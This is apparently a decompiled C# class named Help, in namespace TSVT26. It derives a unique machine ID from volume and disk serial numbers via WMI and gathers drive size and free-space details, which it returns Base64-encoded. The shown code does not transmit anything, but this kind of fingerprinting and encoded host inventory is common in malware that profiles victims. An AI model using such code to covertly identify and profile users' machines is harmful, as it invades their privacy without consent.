using System;
using System.IO;
using System.Management;
using System.Text;

namespace TSVT26;

internal class Help
{
	public static string UniqueID()
	{
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_004c: Unknown result type (might be due to invalid IL or missing references)
		//IL_006b: Unknown result type (might be due to invalid IL or missing references)
		ManagementObject val = new ManagementObject("win32_logicaldisk.deviceid=\"" + Path.GetPathRoot(Environment.GetFolderPath(Environment.SpecialFolder.System))!.Remove(1, 2) + ":\"");
		val.Get();
		string text = ((ManagementBaseObject)val).get_Item("VolumeSerialNumber").ToString();
		if (!string.IsNullOrEmpty(text))
		{
			return text;
		}
		ManagementObjectSearcher val2 = new ManagementObjectSearcher("SELECT * FROM Win32_DiskDrive");
		string result = "";
		ManagementObjectEnumerator enumerator = val2.Get().GetEnumerator();
		try
		{
			while (enumerator.MoveNext())
			{
				result = ((ManagementBaseObject)(ManagementObject)enumerator.get_Current()).get_Item("SerialNumber").ToString();
			}
			return result;
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
	}

	public static string drivesInfo()
	{
		try
		{
			StringBuilder stringBuilder = new StringBuilder();
			DriveInfo[] drives = DriveInfo.GetDrives();
			foreach (DriveInfo driveInfo in drives)
			{
				if (driveInfo.IsReady)
				{
					decimal num = driveInfo.TotalSize / 1024L / 1024L / 1024L;
					decimal num2 = driveInfo.TotalFreeSpace / 1024L / 1024L / 1024L;
					decimal num3 = num - num2;
					stringBuilder.AppendLine("(" + driveInfo.Name.ToString() + ") (" + driveInfo.DriveType.ToString() + ") " + num2 + "GB free of " + num + "GB (" + num3 + ")");
				}
			}
			return Convert.ToBase64String(Encoding.UTF8.GetBytes(stringBuilder.ToString()));
		}
		catch
		{
			return Convert.ToBase64String(Encoding.UTF8.GetBytes("NULL"));
		}
	}
}
